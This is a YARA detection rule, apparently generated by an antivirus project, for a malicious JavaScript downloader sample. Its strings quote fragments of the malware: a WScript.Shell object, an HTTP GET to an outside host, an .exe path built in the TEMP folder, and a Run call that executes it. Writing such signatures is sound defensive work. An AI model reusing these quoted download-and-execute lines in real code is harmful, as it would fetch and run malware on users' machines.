rule sig_20160330_14238982d8791034a62006bc9993e013 {
  meta:
    description = "datamaliciousorder - file 20160330_14238982d8791034a62006bc9993e013.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2fdc22e3ed1c4456fe65e0aaf858f3a78698e586ca83bb8d8c10c45fcdb230ba"

  strings:
    $s1  = "var LK = function W() {return WScript[WU](\"WScript\"+\".Shell\");}(), I1 = 11;" fullword ascii
    $s2  = "function P(MP, GE){X1 = X1 * 1; return MP - GE;};" fullword ascii
    $s3  = "GV[MC](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s4  = "if (GV[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function X(){return RA + \"\";};" fullword ascii
    $s6  = "function T() {return LK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OPxmDM3cdKrkd.ex\" + \"e\";};" fullword ascii
    $s7  = "function MQ() {return ((Z0 == true) && (Z0 == U)) ? 1 : X1;};" fullword ascii
    $s8  = "function X0(B){LK[\"Run\"](B, X1, X1);};" fullword ascii
    $s9  = "var ZS = new this[\"Date\"]();" fullword ascii
    $s10 = "function RL(L) {var V = (1, 2, 3, 4, 5, L); return V;};" fullword ascii
    $s11 = "return P(N, Y);" fullword ascii
    $s12 = "function JC(){return WU;};" fullword ascii
    $s13 = "}while (RQ);" fullword ascii
    $s14 = "function W0()" fullword ascii
    $s15 = "function IK(){return 22;};" fullword ascii
    $s16 = "var Z0 = false;" fullword ascii
    $s17 = "U = true; " fullword ascii
    $s18 = "var U = false;" fullword ascii
    $s19 = "var V1 = false;" fullword ascii
    $s20 = "Z0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}